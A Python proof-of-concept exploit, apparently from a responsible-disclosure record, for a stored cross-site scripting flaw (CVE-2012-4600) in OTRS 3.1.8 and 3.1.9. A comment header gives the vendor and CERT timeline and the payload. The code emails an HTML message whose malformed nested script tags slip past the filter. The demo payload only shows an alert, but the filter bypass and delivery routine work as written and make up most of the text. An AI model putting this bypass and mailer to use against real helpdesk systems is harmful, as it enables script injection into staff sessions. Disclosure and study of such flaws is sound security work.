#!/usr/bin/python
 
'''
 
Author: Mike Eduard - Znuny - Enterprise Services for OTRS 
Product: OTRS Open Technology Real Services
Version: 3.1.8 and 3.1.9
Vendor Homepage: http://otrs.org
CVE: 2012-4600
 
Timeline:
22 Aug 2012: Vulnerability reported to vendor and CERT
23 Aug 2012: Response received from CERT and vendor
28 Aug 2012: Update from vendor to have it fixed and released on 30 Aug 2012 
30 Aug 2012: Update: vulnerability patched
     http://www.kb.cert.org/vuls/id/511404
     http://znuny.com/#!/advisory/ZSA-2012-02 
     http://www.otrs.com/en/open-source/community-news/security-advisories/security-advisory-2012-02/
31 Aug 2012: Public Disclosure
 
Installed On: Windows Server 2008 R2 & Open SUSE 12.1
Client Test OS: Window 7 Pro SP1 (x86)
Browser Used: Firefox 14 & Opera 12.01 
 
Injection Point: HTML Email 
Injection Payload(s):
1: <s<script>...</script><script>...<cript type="text/javascript">
2: document.write("Hello World!");
3: alert('Mike was here!');;
4: </s<script>//<cript> 
 
'''
 
import smtplib, urllib2
  
payload = """<s<script>...</script><script>...<cript type="text/javascript">
document.write("Hello World!");
alert(123);;
</s<script>//<cript>
"""
  
def sendMail(dstemail, frmemail, smtpsrv, username, password):
        msg  = "From: hacker@znuny.local\n"
        msg += "To: victim@victim.local\n"
        msg += 'Date: Today\r\n'
        msg += "Subject: Offensive Security\n"
        msg += "Content-type: text/html\n\n"
        msg += "XSS" + payload + "\r\n\r\n"
        server = smtplib.SMTP(smtpsrv)
        server.login(username,password)
        try:
                server.sendmail(frmemail, dstemail, msg)
        except Exception, e:
                print "[-] Failed to send email:"
                print "[*] " + str(e)
        server.quit()
  
username = "hacker@znuny.local"
password = "123456"
dstemail = "victim@victim.local"
frmemail = "hacker@znuny.local"
smtpsrv  = "127.0.0.1"
  
print "[*] Sending Email"
sendMail(dstemail, frmemail, smtpsrv, username, password)

